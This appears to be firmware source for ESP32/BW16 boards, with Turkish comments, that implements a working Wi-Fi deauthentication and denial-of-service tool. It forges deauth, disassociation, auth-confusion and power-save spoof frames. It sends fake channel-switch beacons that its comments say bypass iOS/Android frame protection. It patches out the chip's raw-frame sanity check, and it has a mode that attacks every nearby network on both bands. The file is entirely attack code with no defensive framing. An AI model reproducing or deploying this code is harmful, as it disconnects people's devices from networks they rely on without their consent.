#include <WiFi.h>
#include "types.h"
#include "board_hal.h"
#include "deauth.h"
#include "definitions.h"

// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
deauth_frame_t deauth_frame     = make_deauth_frame();
int            deauth_type      = DEAUTH_TYPE_SINGLE;
int            eliminated_stations = 0;
char           deauth_target_ssid[33] = {0};
uint8_t        deauth_target_bssid[6] = {0};
int            deauth_target_channel  = 1;

// ─── Düşük seviye bağımlılıklar (yalnızca ESP32) ─────────────────────────────
#ifndef BOARD_BW16
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }
#endif

// ─── CSA Beacon (iOS / Android PMF bypass) ───────────────────────────────────
// Channel Switch Announcement: hedef AP'den sahte beacon gönderir.
// 2.4 GHz: operating class 81, kanal 14 (geçersiz → bağlantı kesilir)
// 5 GHz  : operating class band'e göre, kanal 0 (geçersiz → bağlantı kesilir)
IRAM_ATTR void send_csa_beacon() {
  if (deauth_type != DEAUTH_TYPE_SINGLE) return;

  const uint8_t *bssid    = deauth_frame.access_point;
  const char    *ssid     = deauth_target_ssid;
  uint8_t        channel  = (uint8_t)deauth_target_channel;
  uint8_t        ssid_len = (uint8_t)strnlen(ssid, 32);
  bool           is5ghz   = IS_5GHZ_CHANNEL(deauth_target_channel);

  // 5 GHz için hedeflenecek "geçersiz" kanal ve operating class
  uint8_t csa_channel  = is5ghz ? 0   : 14;  // 0: geçersiz 5GHz, 14: geçersiz 2.4GHz
  uint8_t op_class_24  = 81;
  uint8_t op_class     = is5ghz ? get_5ghz_op_class(channel) : op_class_24;

  uint8_t buf[160];
  uint8_t *p = buf;

  // ── MAC Başlık ──
  *p++ = 0x80; *p++ = 0x00;         // Frame control: Beacon
  *p++ = 0x00; *p++ = 0x00;         // Duration
  memset(p, 0xFF, 6); p += 6;       // DA: broadcast
  memcpy(p, bssid, 6); p += 6;      // SA: hedef BSSID
  memcpy(p, bssid, 6); p += 6;      // BSSID
  *p++ = 0x00; *p++ = 0x00;         // Sequence control

  // ── Beacon Gövdesi ──
  memset(p, 0x00, 8); p += 8;       // Timestamp
  *p++ = 0x64; *p++ = 0x00;         // Beacon interval: 100 TU
  *p++ = 0x11; *p++ = 0x04;         // Capability: ESS + short slot

  // SSID IE
  *p++ = 0x00; *p++ = ssid_len;
  memcpy(p, ssid, ssid_len); p += ssid_len;

  // Supported Rates IE
  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;

  // DS Parameter Set IE (mevcut kanal)
  *p++ = 0x03; *p++ = 0x01; *p++ = channel;

  // CSA IE (ID=37) — eski cihazlar
  *p++ = 0x25; *p++ = 0x03;
  *p++ = 0x01;          // Mode 1 (TX durdur)
  *p++ = csa_channel;   // Geçersiz kanal
  *p++ = 0x01;          // Count 1

  // ECSA IE (ID=60/0x3C) — modern chipset'ler
  *p++ = 0x3C; *p++ = 0x04;
  *p++ = 0x01;          // Mode 1
  *p++ = op_class;      // Operating class (banta göre)
  *p++ = csa_channel;   // Geçersiz kanal
  *p++ = 0x01;          // Count 1

  // Quiet IE (ID=40/0x28) — tüm TX'leri beacon süresince durdurur
  *p++ = 0x28; *p++ = 0x06;
  *p++ = 0x01;          // Quiet count
  *p++ = 0x01;          // Quiet period
  *p++ = 0xFF; *p++ = 0x7F; // Duration: maksimum
  *p++ = 0x00; *p++ = 0x00; // Offset: 0

  int frame_len = (int)(p - buf);

  for (int i = 0; i < 10; i++) {
    hal_wifi_80211_tx(HAL_IF_AP, buf, frame_len);
    delayMicroseconds(500);
  }
}

// ─── Yardımcı: Auth confusion (0xB0) ─────────────────────────────────────────
IRAM_ATTR static void send_auth_confusion(const uint8_t *bssid, const uint8_t *sta) {
  uint8_t buf[30];
  uint8_t *p = buf;
  *p++ = 0xB0; *p++ = 0x00;
  *p++ = 0x3A; *p++ = 0x01;
  memcpy(p, sta,   6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;
  *p++ = 0x00; *p++ = 0x00;
  *p++ = 0x02; *p++ = 0x00;
  *p++ = 0x0D; *p++ = 0x00;
  int len = (int)(p - buf);
  for (int i = 0; i < 10; i++)
    hal_wifi_80211_tx(HAL_IF_AP, buf, len);
}

// ─── Yardımcı: NULL data power-save spoof ────────────────────────────────────
IRAM_ATTR static void send_null_powerdown(const uint8_t *bssid, const uint8_t *sta) {
  uint8_t buf[24];
  uint8_t *p = buf;
  *p++ = 0x48; *p++ = 0x11;
  *p++ = 0x00; *p++ = 0x00;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, sta,   6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;
  int len = (int)(p - buf);
  for (int i = 0; i < 10; i++)
    hal_wifi_80211_tx(HAL_IF_AP, buf, len);
}

// ─── Promiscuous sniffer (birleşik imza) ─────────────────────────────────────
// HAL her iki platformda da aynı imzayı sağlar:
//   const uint8_t *frame, uint16_t len
IRAM_ATTR static void sniffer_cb(const uint8_t *frame, uint16_t len) {
  if (len < sizeof(mac_hdr_t)) return;
  const wifi_packet_t *pkt = (const wifi_packet_t *)frame;
  const mac_hdr_t     *hdr = &pkt->hdr;

  static const uint8_t reasons[4] = {7, 6, 2, 3};

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(hdr->dest, deauth_frame.sender, 6) != 0) return;
    memcpy(deauth_frame.station, hdr->src, 6);

    // Yön 1: AP → Station
    for (int r = 0; r < 4; r++) {
      deauth_frame.frame_control[0] = 0xC0;
      deauth_frame.reason = reasons[r];
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &deauth_frame, sizeof(deauth_frame));

      deauth_frame.frame_control[0] = 0xA0;
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &deauth_frame, sizeof(deauth_frame));
    }

    // Yön 2: Station → AP spoof
    {
      deauth_frame_t f_rev = make_deauth_frame();
      memcpy(f_rev.access_point, deauth_frame.access_point, 6);
      memcpy(f_rev.sender,       hdr->src,                  6);
      memcpy(f_rev.station,      deauth_frame.access_point, 6);
      f_rev.frame_control[0] = 0xC0; f_rev.reason = 3;
      for (int i = 0; i < 10; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));
      f_rev.frame_control[0] = 0xA0; f_rev.reason = 8;
      for (int i = 0; i < 10; i++)
        hal_wifi_80211_tx(HAL_IF_AP, &f_rev, sizeof(f_rev));
    }

    // Auth confusion + NULL power-save
    send_auth_confusion(deauth_frame.access_point, hdr->src);
    send_null_powerdown(deauth_frame.access_point, hdr->src);

    // Broadcast DEAUTH + DISASSOC
    memset(deauth_frame.station, 0xFF, 6);
    deauth_frame.frame_control[0] = 0xC0; deauth_frame.reason = 3;
    for (int i = 0; i < 6; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &deauth_frame, sizeof(deauth_frame));
    deauth_frame.frame_control[0] = 0xA0;
    for (int i = 0; i < 6; i++)
      hal_wifi_80211_tx(HAL_IF_AP, &deauth_frame, sizeof(deauth_frame));

    memcpy(deauth_frame.station, hdr->src, 6);
    deauth_frame.frame_control[0] = 0xC0;
    deauth_frame.reason = 1;

  } else { // DEAUTH_TYPE_ALL
    if ((memcmp(hdr->dest, hdr->bssid, 6) != 0) ||
        (memcmp(hdr->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0)) return;

    memcpy(deauth_frame.station,      hdr->src,  6);
    memcpy(deauth_frame.access_point, hdr->dest, 6);
    memcpy(deauth_frame.sender,       hdr->dest, 6);

    for (int r = 0; r < 4; r++) {
      deauth_frame.frame_control[0] = 0xC0; deauth_frame.reason = reasons[r];
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        hal_wifi_80211_tx(HAL_IF_STA, &deauth_frame, sizeof(deauth_frame));
      deauth_frame.frame_control[0] = 0xA0;
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
        hal_wifi_80211_tx(HAL_IF_STA, &deauth_frame, sizeof(deauth_frame));
    }

    // Station → AP spoof
    {
      deauth_frame_t f_rev = make_deauth_frame();
      memcpy(f_rev.access_point, hdr->dest, 6);
      memcpy(f_rev.sender,       hdr->src,  6);
      memcpy(f_rev.station,      hdr->dest, 6);
      f_rev.frame_control[0] = 0xC0; f_rev.reason = 3;
      for (int i = 0; i < 8; i++)
        hal_wifi_80211_tx(HAL_IF_STA, &f_rev, sizeof(f_rev));
      f_rev.frame_control[0] = 0xA0; f_rev.reason = 8;
      for (int i = 0; i < 8; i++)
        hal_wifi_80211_tx(HAL_IF_STA, &f_rev, sizeof(f_rev));
    }

    // Broadcast
    memset(deauth_frame.station, 0xFF, 6);
    deauth_frame.frame_control[0] = 0xC0; deauth_frame.reason = 3;
    for (int i = 0; i < 4; i++)
      hal_wifi_80211_tx(HAL_IF_STA, &deauth_frame, sizeof(deauth_frame));
    deauth_frame.frame_control[0] = 0xA0;
    for (int i = 0; i < 4; i++)
      hal_wifi_80211_tx(HAL_IF_STA, &deauth_frame, sizeof(deauth_frame));

    memcpy(deauth_frame.station, hdr->src, 6);
    deauth_frame.frame_control[0] = 0xC0;
    deauth_frame.reason = 1;
  }

  eliminated_stations++;
  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

// ─── Hedef yeniden bulma ───────────────────────────────────────────────────────
void retrack_deauth_target() {
  if (deauth_type != DEAUTH_TYPE_SINGLE) return;
  if (strnlen(deauth_target_ssid, 33) == 0) return;

  DEBUG_PRINT("Hedef yeniden taraniyor: ");
  DEBUG_PRINTLN(deauth_target_ssid);

  hal_wifi_set_promiscuous(false);

  // BW16: hem 2.4 hem 5GHz tara
  int n = WiFi.scanNetworks(false, true, false, 120);
  for (int i = 0; i < n; i++) {
    if (strcmp(WiFi.SSID(i).c_str(), deauth_target_ssid) == 0) {
      int    new_ch          = WiFi.channel(i);
      bool   bssid_changed   = memcmp(WiFi.BSSID(i), deauth_target_bssid, 6) != 0;
      bool   chan_changed    = (new_ch != deauth_target_channel);

      if (chan_changed || bssid_changed) {
        deauth_target_channel = new_ch;
        memcpy(deauth_target_bssid, WiFi.BSSID(i), 6);
        memcpy(deauth_frame.access_point, deauth_target_bssid, 6);
        memcpy(deauth_frame.sender,       deauth_target_bssid, 6);
        WiFi.softAP(AP_SSID, AP_PASS, deauth_target_channel);
        delay(100);
        apply_max_performance();
        DEBUG_PRINTF("Hedef yeni kanal: %d %s\n",
          deauth_target_channel,
          IS_5GHZ_CHANNEL(deauth_target_channel) ? "(5GHz)" : "(2.4GHz)");
      }
      break;
    }
  }
  WiFi.scanDelete();

  hal_wifi_set_promiscuous(true);
  hal_wifi_set_promiscuous_filter();
  hal_wifi_set_promiscuous_rx_cb(sniffer_cb);
}

// ─── Saldırı başlat/durdur ────────────────────────────────────────────────────
void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type         = attack_type;
  deauth_frame        = make_deauth_frame();
  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    strncpy(deauth_target_ssid, WiFi.SSID(wifi_number).c_str(), 32);
    deauth_target_ssid[32]  = '\0';
    deauth_target_channel   = WiFi.channel(wifi_number);
    memcpy(deauth_target_bssid, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.access_point, deauth_target_bssid, 6);
    memcpy(deauth_frame.sender,       deauth_target_bssid, 6);

    DEBUG_PRINT("Deauth baslatiyor: ");
    DEBUG_PRINT(deauth_target_ssid);
    DEBUG_PRINTF(" Kanal %d %s\n",
      deauth_target_channel,
      IS_5GHZ_CHANNEL(deauth_target_channel) ? "(5GHz)" : "(2.4GHz)");

    WiFi.softAP(AP_SSID, AP_PASS, deauth_target_channel);
    delay(100);
    apply_max_performance();
  } else {
    DEBUG_PRINTLN("Tum aglara deauth (2.4+5GHz)...");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
    delay(100);
    apply_max_performance();
  }

  hal_wifi_set_promiscuous(true);
  hal_wifi_set_promiscuous_filter();
  hal_wifi_set_promiscuous_rx_cb(sniffer_cb);
}

void stop_deauth() {
  hal_wifi_set_promiscuous(false);
  deauth_type            = DEAUTH_TYPE_SINGLE;
  deauth_target_ssid[0]  = '\0';
  eliminated_stations    = 0;
}
